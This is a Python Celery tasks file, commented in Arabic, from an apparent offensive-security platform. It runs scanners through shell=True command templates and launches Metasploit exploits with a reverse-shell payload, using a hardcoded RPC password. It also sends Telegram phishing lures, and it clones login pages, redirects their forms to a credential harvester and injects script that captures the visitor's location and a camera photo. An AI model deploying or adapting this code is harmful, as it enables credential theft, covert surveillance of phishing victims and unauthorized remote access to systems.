# core/tasks.py
import requests
import subprocess
import json
import os
from celery import shared_task
from django.utils import timezone
import requests
from django.conf import settings
from .models import Scan, Vulnerability, Alert, ActionLog, Playbook, Tool
import glob
import shutil # <-- مكتبة جديدة لحذف المجلدات
from pymetasploit3.msfrpc import MsfRpcClient # <-- استيراد المكتبة
import google.generativeai as genai
from django.conf import settings
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from .models import LandingPage
from django.core.mail import send_mail
from django.template import Template, Context
from .models import PhishingCampaign, PhishingResult
from django.utils import timezone




@shared_task
def execute_scan_task(scan_id, target_for_tool): # <-- تم إضافة الوسيط الجديد
    """
    مهمة Celery عامة تقوم بتشغيل أي أداة فحص فردية.
    """
    try:
        scan = Scan.objects.get(id=scan_id)
        tool = scan.tool
    except (Scan.DoesNotExist, Tool.DoesNotExist):
        print(f"ERROR: Scan or Tool not found for scan_id {scan_id}.")
        return f"Scan or Tool not found for scan_id {scan_id}."

    scan.status = 'RUNNING'
    scan.save()
    
    output_path = f"/tmp/scan_report_{scan_id}"
    
    # بناء الأمر ديناميكيًا باستخدام الوسيط الجديد 'target_for_tool'
    command_str = tool.command_template.format(target=target_for_tool, output=output_path, host_ip='127.0.0.1')
    
    result_message = ""
    print(f"Executing command for scan {scan.id}: {command_str}")

    try:
        result = subprocess.run(
            command_str,
            shell=True,
            check=True,
            timeout=3600,
            capture_output=True,
            text=True
        )
        print(f"[{tool.name} Scan {scan.id}] STDOUT:\n{result.stdout}")
        print(f"[{tool.name} Scan {scan.id}] STDERR:\n{result.stderr}")

        # منطق التحليل لجميع الأدوات
        if tool.name == 'Nikto':
            parse_nikto_json(scan, output_path)
        elif tool.name == 'Nmap':
            parse_nmap_text(scan, output_path)
        elif tool.name == 'dirsearch':
            parse_dirsearch_report(scan, output_path)
        elif tool.name == 'Nuclei':
            parse_nuclei_jsonl(scan, output_path)
        elif tool.name == 'SQLMap':
            parse_sqlmap_output(scan, output_path)
        elif tool.name == 'Subfinder':
            parse_subfinder_output(scan, output_path)
        elif tool.name == 'Amass':
            parse_amass_output(scan, output_path)
        elif tool.name == 'Trufflehog':
            parse_trufflehog_json(scan, output_path)
        elif tool.name == 'Subjack':
            parse_subjack_json(scan, output_path)
        elif tool.name == 'XXEinjector':
            parse_xxeinjector_output(scan, result)
        
        scan.status = 'COMPLETED'
        result_message = f"{tool.name} scan for {scan.target_url} completed successfully."

    except subprocess.CalledProcessError as e:
        scan.status = 'FAILED'
        result_message = f"{tool.name} process failed. Check worker logs for details."
        print(f"ERROR for scan {scan.id}: {tool.name} failed with exit code {e.returncode}")
        print(f"STDERR from tool:\n{e.stderr}")
    except subprocess.TimeoutExpired:
        scan.status = 'FAILED'
        result_message = "Scan timed out after 1 hour."
    except Exception as e:
        scan.status = 'FAILED'
        result_message = f"An unexpected error occurred: {str(e)}"
        print(f"UNEXPECTED ERROR for scan {scan.id}: {str(e)}")
    
    finally:
        scan.completed_at = timezone.now()
        scan.save()
        
        # منطق التنظيف النهائي
        if os.path.isdir(output_path):
            shutil.rmtree(output_path)
        elif os.path.exists(output_path):
            os.remove(output_path)
        
        # تنظيف ملف الطلب المؤقت الخاص بـ XXEinjector
        if tool.name == 'XXEinjector' and os.path.exists(target_for_tool):
            os.remove(target_for_tool)

    print(result_message)
    return result_message
# --- دوال مساعدة لتحليل مخرجات الأدوات ---

def parse_nikto_json(scan, file_path):
    """
    تحلل تقرير Nikto بصيغة JSON، مع معالجة التنسيقات المختلفة.
    """
    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
        print(f"Nikto report file not found or is empty: {file_path}")
        return

    with open(file_path, 'r') as f:
        try:
            report_data = json.load(f)
        except json.JSONDecodeError:
            print(f"Error decoding JSON from Nikto report: {file_path}")
            # يمكنك هنا إضافة منطق لقراءة الملف كنص عادي وتسجيله
            return

    # --- منطق ذكي للتعامل مع التنسيقات المختلفة ---
    hosts = []
    if isinstance(report_data, dict):
        # التنسيق القياسي والناجح
        hosts = report_data.get('hosts', [])
    elif isinstance(report_data, list):
        # حالة خاصة قد تحدث عند وجود أخطاء
        # نفترض أن كل عنصر في القائمة هو تقرير مضمن
        hosts = report_data

    if not hosts:
        print(f"No 'hosts' found in Nikto report for scan {scan.id}")
        return
    # ----------------------------------------------
        
    for host_report in hosts:
        # التأكد من أن host_report هو قاموس قبل استخدام .get()
        if not isinstance(host_report, dict):
            continue

        for vuln in host_report.get('vulnerabilities', []):
            Vulnerability.objects.create(
                scan=scan, 
                description=vuln.get('description', 'No description provided.'), 
                severity=vuln.get('id', 'N/A'), 
                details=vuln
            )

def parse_nmap_text(scan, file_path):
    """
    تحلل تقرير Nmap النصي (مخرجات -oN) وتنشئ سجلات للبورتات المفتوحة.
    """
    if not os.path.exists(file_path):
        print(f"Nmap report file not found: {file_path}")
        return
        
    with open(file_path, 'r') as f:
        for line in f:
            line = line.strip()
            # البحث عن الأسطر التي تحتوي على بورت مفتوح
            if '/tcp' in line and 'open' in line:
                parts = [p for p in line.split() if p] # تقسيم السطر وإزالة المسافات الزائدة
                if len(parts) >= 3:
                    port = parts[0]
                    service = " ".join(parts[2:])
                    Vulnerability.objects.create(
                        scan=scan, 
                        description=f"Open Port: {port} - Service: {service}",
                        severity="Informational", 
                        details={'port': port, 'service': service, 'raw_line': line}
                    )

# --- مهمة إثراء البيانات من VirusTotal ---

@shared_task
def enrich_ip_with_virustotal(alert_id, playbook_id):
    """
    Celery task لإغناء عنوان IP باستخدام VirusTotal API.
    """
    try:
        alert = Alert.objects.get(id=alert_id)
        playbook = Playbook.objects.get(id=playbook_id)
    except (Alert.DoesNotExist, Playbook.DoesNotExist):
        return f"Alert or Playbook not found."

    if not alert.source_ip:
        details = "Playbook failed: Alert has no source IP address."
        ActionLog.objects.create(alert=alert, playbook_run=playbook, details=details)
        return details

    ip_address = alert.source_ip
    api_key = settings.VIRUSTOTAL_API_KEY
    url = f"https://www.virustotal.com/api/v3/ip_addresses/{ip_address}"
    headers = {"x-apikey": api_key}
    details = ""

    try:
        response = requests.get(url, headers=headers, timeout=20)
        response.raise_for_status()
        data = response.json().get('data', {}).get('attributes', {})
        
        stats = data.get('last_analysis_stats', {})
        details = (
            f"VirusTotal analysis for {ip_address}:\n"
            f"- Malicious: {stats.get('malicious', 0)}, Suspicious: {stats.get('suspicious', 0)}\n"
            f"- Country: {data.get('country', 'N/A')}\n"
            f"- Owner: {data.get('as_owner', 'N/A')}"
        )
        ActionLog.objects.create(alert=alert, playbook_run=playbook, details=details)
        return f"Successfully enriched IP {ip_address}."

    except requests.RequestException as e:
        details = f"VirusTotal API request failed for IP {ip_address}. Error: {str(e)}"
        ActionLog.objects.create(alert=alert, playbook_run=playbook, details=details)
        return details
    
def parse_dirsearch_report(scan, file_path):
    if not os.path.exists(file_path): return
    with open(file_path, 'r') as f:
        for line in f:
            # النتائج الحقيقية لا تبدأ بـ '#'
            if line.strip() and not line.startswith('#'):
                # السطر عادة ما يكون: [TIME] STATUS SIZE --> URL
                parts = line.split('-->')
                if len(parts) > 1:
                    url = parts[1].strip()
                    Vulnerability.objects.create(
                        scan=scan,
                        description=f"Discovered Path: {url}",
                        severity="Informational",
                        details={'raw_line': line.strip()}
                    )
                    
# --- إضافة جديدة: دالة تحليل لـ Nuclei ---
def parse_nuclei_jsonl(scan, file_path):
    if not os.path.exists(file_path): return
    with open(file_path, 'r') as f:
        for line in f:
            try:
                data = json.loads(line)
                info = data.get('info', {})
                
                # --- هذا هو الجزء الذي تم تصحيحه ---
                cve_ids_raw = info.get('classification', {}).get('cve-id')
                cve_id_str = ""
                # نتأكد من أن cve_ids_raw هو قائمة قبل استخدام join
                if isinstance(cve_ids_raw, list):
                    cve_id_str = ", ".join(cve_ids_raw)
                # ------------------------------------

                Vulnerability.objects.create(
                    scan=scan,
                    description=info.get('name', 'No description provided.'),
                    severity=info.get('severity', 'unknown').capitalize(),
                    cve_id=cve_id_str, # نستخدم السلسلة النصية الآمنة
                    details=data
                )
            except json.JSONDecodeError:
                continue

# --- إضافة جديدة: دالة تحليل لـ SQLMap ---
def parse_sqlmap_output(scan, output_dir):
    """
    تحلل مخرجات sqlmap من مجلد النتائج.
    """
    # sqlmap ينشئ مجلدًا للهدف، وبداخله ملف 'log'
    # المسار سيكون شيئًا مثل: /tmp/scan_report_XX/testphp.vulnweb.com/log
    log_file_path = glob.glob(os.path.join(output_dir, '*', 'log'))

    if not log_file_path:
        print(f"SQLMap log file not found in {output_dir}")
        return

    with open(log_file_path[0], 'r') as f:
        content = f.read()
        # نبحث عن علامات تدل على وجود ثغرة
        if "Parameter:" in content and "Type:" in content and "Payload:" in content:
            # يمكننا جعل هذا التحليل أكثر ذكاءً لاستخراج تفاصيل الثغرة
            Vulnerability.objects.create(
                scan=scan,
                description="Potential SQL Injection vulnerability found.",
                severity="Critical",
                details={'log_content': content[:2000]} # حفظ أول 2000 حرف من السجل
            )


@shared_task
def run_metasploit_exploit(vuln_id):
    try:
        vuln = Vulnerability.objects.get(id=vuln_id)
    except Vulnerability.DoesNotExist:
        return f"Vulnerability {vuln_id} not found."

    # --- الاتصال بخدمة Metasploit ---
    try:
        client = MsfRpcClient('rax111rax', server='127.0.0.1', port=55553)
    except Exception as e:
        # لا يوجد سجل ActionLog هنا لأننا لا نملك كائن Alert
        print(f"Failed to connect to Metasploit RPC: {e}")
        return f"Failed to connect to Metasploit RPC: {e}"

    try:
        exploit = client.modules.use('exploit', vuln.metasploit_module)
        
        # تعيين الهدف
        exploit['RHOSTS'] = vuln.scan.target_url
        
        # يمكنك هنا تعيين خيارات أخرى إذا لزم الأمر، مثل RPORT
        
        # تنفيذ الاستغلال
        result = exploit.execute(payload='generic/shell_reverse_tcp')

        # التحقق من النتيجة
        if result and result.get('job_id') is not None:
            # يمكننا التحقق من قائمة الجلسات (sessions) لتأكيد النجاح
            sessions = client.sessions.list
            if sessions:
                details = f"Metasploit exploit successful! Session opened: {sessions}"
                print(details)
            else:
                details = "Metasploit exploit executed, but no session was created."
        else:
            details = "Metasploit exploit failed to execute."

        # ملاحظة: لا يوجد ActionLog هنا، يمكن إضافة سجل مخصص لاحقًا
        return details

    except Exception as e:
        return f"An error occurred during exploit execution: {str(e)}"
    
    
@shared_task
def analyze_vulnerability_with_ai(vuln_id):
    try:
        vuln = Vulnerability.objects.get(id=vuln_id)
    except Vulnerability.DoesNotExist:
        return f"Vulnerability {vuln_id} not found."

    # تكوين Gemini
    genai.configure(api_key=settings.GEMINI_API_KEY)
    model = genai.GenerativeModel('gemini-1.5-flash')

    # تحضير السؤال (Prompt)
    # سنعطي النموذج كل المعلومات التي لدينا عن الثغرة
    prompt = f"""
    You are an expert cybersecurity analyst. Analyze the following vulnerability finding and provide a concise, structured report in Markdown format.

    **Vulnerability Information:**
    - **Description:** {vuln.description}
    - **Severity:** {vuln.severity}
    - **Details (JSON):** {json.dumps(vuln.details, indent=2)}

    **Your report must include the following sections:**
    1.  **## What is this?** (A simple, clear explanation of the vulnerability).
    2.  **## What is the risk?** (Explain the potential impact, e.g., data theft, server takeover).
    3.  **## How to fix it?** (Provide clear, actionable steps for a system administrator to patch or mitigate this vulnerability).
    4.  **## How to exploit it?** (Briefly describe the general steps an attacker would take to exploit this, for educational purposes).
    """

    try:
        response = model.generate_content(prompt)
        analysis_text = response.text

        # حفظ التحليل في قاعدة البيانات
        vuln.ai_analysis = analysis_text
        vuln.save()
        
        return f"Successfully analyzed vulnerability #{vuln.id}."
    except Exception as e:
        error_message = f"Failed to get analysis from Gemini API: {str(e)}"
        # يمكنك حفظ رسالة الخطأ في حقل التحليل للتشخيص
        vuln.ai_analysis = error_message
        vuln.save()
        return error_message
    
    
def parse_subfinder_output(scan, file_path):
    if not os.path.exists(file_path): return
    with open(file_path, 'r') as f:
        for line in f:
            subdomain = line.strip()
            if subdomain:
                Vulnerability.objects.create(
                    scan=scan,
                    description=f"Discovered Subdomain: {subdomain}",
                    severity="Informational", # اكتشاف النطاقات هو معلومة استطلاعية
                    details={'subdomain': subdomain}
                )

def parse_amass_output(scan, file_path):
    if not os.path.exists(file_path): return
    with open(file_path, 'r') as f:
        for line in f:
            subdomain = line.strip()
            if subdomain:
                Vulnerability.objects.create(
                    scan=scan,
                    description=f"Discovered Asset: {subdomain}",
                    severity="Informational",
                    details={'asset': subdomain}
                )
                
def parse_ghauri_json(scan, file_path):
    if not os.path.exists(file_path): return
    with open(file_path, 'r') as f:
        try:
            report_data = json.load(f)
            # Ghauri يضع النتائج داخل قائمة 'vulnerabilities'
            for vuln in report_data.get('vulnerabilities', []):
                # نجمع التفاصيل في وصف واحد
                description = f"Ghauri found SQLi. Parameter: {vuln.get('parameter')}, Type: {vuln.get('type')}"
                Vulnerability.objects.create(
                    scan=scan,
                    description=description,
                    severity="Critical",
                    details=vuln # نحفظ كل تفاصيل الثغرة
                )
        except json.JSONDecodeError:
            print(f"Error decoding JSON from Ghauri report: {file_path}")
            
def parse_trufflehog_json(scan, file_path):
    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0: return
    with open(file_path, 'r') as f:
        try:
            # Trufflehog v3 يخرج JSON object لكل سر في سطر منفصل (JSONL)
            for line in f:
                if line.strip():
                    data = json.loads(line)
                    Vulnerability.objects.create(
                        scan=scan,
                        description=f"Leaked Secret Found: {data.get('DetectorName')}",
                        severity="Critical", # أي سر مكشوف هو حرج
                        details=data # نحفظ كل التفاصيل
                    )
        except json.JSONDecodeError:
            print(f"Error decoding JSON from Trufflehog report: {file_path}")

@shared_task
def run_recon_and_attack_playbook(scan_id):
    try:
        scan = Scan.objects.get(id=scan_id)
    except Scan.DoesNotExist:
        return "Scan not found."

    scan.status = 'RUNNING'
    scan.save()

    # --- المرحلة 1: تشغيل Subfinder ---
    subfinder_output_file = f"/tmp/subfinder_{scan.id}.txt"
    subfinder_tool = Tool.objects.get(name='Subfinder')
    subfinder_cmd = subfinder_tool.command_template.format(target=scan.target_url, output=subfinder_output_file)
    
    print(f"Playbook (Step 1): Running Subfinder: {subfinder_cmd}")
    try:
        subprocess.run(subfinder_cmd.split(), check=True, timeout=600)
    except Exception as e:
        scan.status = 'FAILED'
        scan.save()
        return f"Playbook failed at Subfinder step: {e}"

    if not os.path.exists(subfinder_output_file):
        scan.status = 'COMPLETED' # اكتمل ولكن لم يجد شيئًا
        scan.save()
        return "Subfinder found no subdomains."

    # --- المرحلة 2: تشغيل Nuclei ---
    nuclei_output_file = f"/tmp/nuclei_{scan.id}.jsonl"
    nuclei_tool = Tool.objects.get(name='Nuclei')
    # تعديل أمر Nuclei ليقرأ من ملف (-l) بدلاً من هدف واحد (-u)
    nuclei_cmd_str = nuclei_tool.command_template.replace('-u {target}', f'-l {subfinder_output_file}')
    nuclei_cmd_str = nuclei_cmd_str.format(target=scan.target_url, output=nuclei_output_file)
    
    print(f"Playbook (Step 2): Running Nuclei: {nuclei_cmd_str}")
    try:
        subprocess.run(nuclei_cmd_str.split(), check=True, timeout=3600)
    except Exception as e:
        scan.status = 'FAILED'
        scan.save()
        # تنظيف ملف subfinder
        os.remove(subfinder_output_file)
        return f"Playbook failed at Nuclei step: {e}"

    # --- المرحلة 3: تحليل نتائج Nuclei ---
    parse_nuclei_jsonl(scan, nuclei_output_file)
    
    scan.status = 'COMPLETED'
    scan.completed_at = timezone.now()
    scan.save()
    
    # تنظيف الملفات المؤقتة
    os.remove(subfinder_output_file)
    os.remove(nuclei_output_file)
    
    return f"Playbook 'Recon & Attack' completed for {scan.target_url}."


def parse_xxeinjector_output(scan, process_result): # <-- الآن نستقبل نتيجة العملية الكاملة
    # process_result هو الكائن الذي يرجعه subprocess.run
    # content هو المخرجات النصية من stdout
    content = process_result.stdout

    if content and ("VULNERABLE" in content or "file retrieved" in content or "Directory listing" in content):
        Vulnerability.objects.create(
            scan=scan,
            description="Potential XXE Injection vulnerability found by XXEinjector.",
            severity="High",
            details={'report_content': content}
        )
        
        
def parse_subjack_json(scan, file_path):
    """
    تحلل تقرير Subjack بصيغة JSONL وتنشئ سجلات للثغرات المكتشفة.
    """
    # التحقق من وجود الملف وأنه ليس فارغًا
    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
        print(f"Subjack report file not found or is empty: {file_path}")
        return

    with open(file_path, 'r') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue # تجاهل الأسطر الفارغة

            try:
                # كل سطر هو كائن JSON منفصل
                data = json.loads(line)

                # نحن نهتم فقط بالنتائج التي تم تأكيد أنها ضعيفة
                if data.get('status') == 'Vulnerable':
                    # تكوين وصف واضح للثغرة
                    description = (
                        f"Potential Subdomain Takeover on '{data.get('subdomain')}'."
                        f" Service identified: {data.get('service')}."
                    )
                    
                    Vulnerability.objects.create(
                        scan=scan,
                        description=description,
                        severity="High", # الاستيلاء على نطاق فرعي هو دائمًا خطير
                        details=data # نحفظ كل تفاصيل النتيجة كـ JSON
                    )
            
            except json.JSONDecodeError:
                print(f"Warning: Could not decode JSON line from Subjack report: {line}")
                continue # انتقل إلى السطر التالي في حالة وجود خطأ
            
            
@shared_task
def run_eyewitness_on_scan(scan_id):
    try:
        scan = Scan.objects.get(id=scan_id)
    except Scan.DoesNotExist:
        return "Scan not found."

    # 1. جمع الأهداف من نتائج الفحص الأصلي
    targets = [v.details.get('subdomain') or v.details.get('asset') for v in scan.vulnerabilities.all()]
    # إزالة أي قيم فارغة
    targets = [t for t in targets if t]

    if not targets:
        return "No subdomains or assets found in the original scan to run Eyewitness on."

    # 2. إنشاء ملف أهداف مؤقت
    target_file = f"/tmp/eyewitness_targets_{scan.id}.txt"
    with open(target_file, 'w') as f:
        for target in targets:
            f.write(f"http://{target}\n")
            f.write(f"https://{target}\n")

    # 3. إعداد مسارات Eyewitness
    eyewitness_script_path = "/home/ahmad/EyeWitness/Python/EyeWitness.py"
    output_dir_temp = f"/tmp/eyewitness_report_{scan.id}"
    
    command = [
        eyewitness_script_path,
        '-f', target_file,
        '-d', output_dir_temp,
        '--no-prompt'
    ]
    
    try:
        subprocess.run(command, check=True, timeout=1800)

        # 4. نقل التقرير إلى مجلد media
        final_report_dir = os.path.join(settings.MEDIA_ROOT, 'eyewitness_reports', str(scan.id))
        if os.path.exists(output_dir_temp):
            shutil.move(output_dir_temp, final_report_dir)
            
            # 5. حفظ مسار التقرير في قاعدة البيانات
            scan.eyewitness_report_path = os.path.join('eyewitness_reports', str(scan.id), 'report.html')
            scan.save()
            
            return f"Eyewitness report generated for scan {scan.id}."
    except Exception as e:
        return f"Eyewitness failed: {e}"
    finally:
        if os.path.exists(target_file):
            os.remove(target_file)
                


@shared_task
def launch_phishing_campaign(campaign_id):
    """
    مهمة Celery لإطلاق حملة تصيد: إرسال رسائل عبر تيليجرام (مع دعم الرسائل المخصصة).
    """
    try:
        campaign = PhishingCampaign.objects.get(id=campaign_id)
    except PhishingCampaign.DoesNotExist:
        return f"Campaign {campaign_id} not found."

    campaign.status = 'IN_PROGRESS'
    campaign.save()

    BASE_URL = "http://127.0.0.1:8000"
    
    sent_count = 0
    total_targets = campaign.targets.count()

    for target in campaign.targets.all():
        result, created = PhishingResult.objects.get_or_create(campaign=campaign, target=target)
        if result.is_sent:
            continue

        phishing_url = f"{BASE_URL}/track/click/{result.unique_id}/"

        message_sent = False
        # 1. محاولة الإرسال عبر تيليجرام أولاً إذا كان ID موجودًا
        if target.telegram_user_id:
            try:
                bot_token = settings.TELEGRAM_BOT_TOKEN
                chat_id = target.telegram_user_id
                
                # --- هذا هو المنطق الجديد لتخصيص الرسالة ---
                
                # جلب الرسالة المخصصة من قالب البريد
                telegram_template_str = campaign.email_template.telegram_message
                
                # إذا كان الحقل فارغًا، استخدم رسالة افتراضية
                if not telegram_template_str:
                    telegram_template_str = (
                        "Hello {{target_name}},\n\n"
                        "A security alert requires your attention. Please review the following document immediately:\n"
                        "{{phishing_link}}"
                    )

                # استخدام نظام قوالب Django لتخصيص الرسالة
                template = Template(telegram_template_str)
                context = Context({
                    'target_name': target.name or target.email,
                    'phishing_link': phishing_url
                })
                message_text = template.render(context)
                # ---------------------------------------------
                
                api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                payload = {'chat_id': chat_id, 'text': message_text}
                
                response = requests.post(api_url, data=payload, timeout=10)
                
                if response.json().get('ok'):
                    print(f"Successfully sent Telegram message to {target.email}")
                    message_sent = True
                else:
                    # طباعة الخطأ الفعلي من تيليجرام
                    print(f"Failed to send Telegram message to {target.email}: {response.json()}")
            
            except Exception as e:
                print(f"An unexpected error occurred while sending Telegram message: {e}")

        # 2. (مستقبلاً) يمكنك إضافة منطق إرسال البريد الإلكتروني هنا كخيار احتياطي
        # if not message_sent:
        #     # ...
        
        if message_sent:
            result.is_sent = True
            result.sent_date = timezone.now()
            result.save()
            sent_count += 1
    
    campaign.status = 'COMPLETED'
    campaign.save()
    
    return f"Campaign '{campaign.name}' completed. {sent_count} of {total_targets} messages sent."

@shared_task
def clone_landing_page(page_id, url_to_clone):
    """
    مهمة Celery لاستنساخ صفحة هبوط، تعديلها، وحقن سكربت التقاط الأدلة.
    """
    try:
        page = LandingPage.objects.get(id=page_id)
    except LandingPage.DoesNotExist:
        return f"LandingPage with id {page_id} not found."

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    }

    try:
        response = requests.get(url_to_clone, headers=headers, timeout=20)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, 'html.parser')

        # --- المنطق الذكي لتعديل الصفحة ---

        # 1. تحويل كل الروابط (CSS, JS, images, etc.) إلى روابط مطلقة
        for tag in soup.find_all(['link', 'script', 'img', 'a', 'source']):
            for attr in ['href', 'src']:
                if tag.has_attr(attr) and tag[attr] and not tag[attr].startswith(('http', '//', '#', 'data:')):
                    # استخدام urljoin للتعامل مع المسارات المعقدة بشكل صحيح
                    tag[attr] = urljoin(url_to_clone, tag[attr])

        # 2. البحث عن نموذج تسجيل الدخول وتعديله
        form = soup.find('form')
        if form:
            harvester_url = "/phish/submit/" # الرابط الذي سيستقبل البيانات
            form['action'] = harvester_url
            form['method'] = 'post'

        # 3. إعداد وحقن سكربت التقاط الأدلة
        evidence_script_html = """
        <script>
            (async function() {
                // استخراج الـ UUID الفريد من مسار URL الحالي
                const pathParts = window.location.pathname.split('/');
                const resultId = pathParts[pathParts.length - 2];
                const evidenceUrl = `/phish/evidence/${resultId}/`;
                const evidencePayload = {};

                // 1. التقاط بيانات الجهاز (User Agent)
                evidencePayload.userAgent = navigator.userAgent;

                // 2. طلب الوصول إلى الموقع الجغراfi
                if ("geolocation" in navigator) {
                    try {
                        const position = await new Promise((resolve, reject) => {
                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
                        });
                        evidencePayload.geolocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                    } catch (err) {
                        evidencePayload.geolocation = { error: err.message };
                    }
                }

                // 3. طلب الوصول إلى الكاميرا والتقاط صورة
                if ("mediaDevices" in navigator && "getUserMedia" in navigator.mediaDevices) {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                        const video = document.createElement('video');
                        video.setAttribute('playsinline', '');
                        video.srcObject = stream;
                        await video.play();

                        // انتظر قليلاً لضمان أن الكاميرا قد بدأت بالفعل
                        await new Promise(resolve => setTimeout(resolve, 500));

                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        evidencePayload.image_data = canvas.toDataURL('image/jpeg');
                        
                        // إيقاف بث الكاميرا فورًا بعد التقاط الصورة
                        stream.getTracks().forEach(track => track.stop());
                    } catch (err) {
                        evidencePayload.image_data = { error: err.message };
                    }
                }

                // 4. إرسال كل الأدلة التي تم جمعها إلى الخادم
                fetch(evidenceUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(evidencePayload)
                });
            })();
        </script>
        """
        
        # حقن السكربت قبل إغلاق وسم </body>
        if soup.body:
            soup.body.append(BeautifulSoup(evidence_script_html, 'html.parser'))

        # حفظ الـ HTML النهائي والمعدل في قاعدة البيانات
        page.html_content = str(soup)
        page.save()
        
        return f"Successfully cloned and instrumented page for '{page.name}'."

    except requests.RequestException as e:
        error_message = f"Failed to clone page: {e}"
        page.html_content = error_message
        page.save()
        return error_message
    
    